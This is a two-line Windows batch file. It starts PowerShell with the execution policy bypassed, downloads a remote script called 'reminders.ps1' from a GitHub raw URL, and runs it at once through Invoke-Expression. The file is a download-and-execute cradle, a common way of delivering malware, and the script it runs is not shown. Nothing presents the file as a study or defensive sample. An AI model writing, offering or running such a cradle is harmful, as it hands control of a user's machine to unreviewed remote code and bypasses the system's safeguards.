@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kiyan-7/telaviv/main/reminders.ps1')"
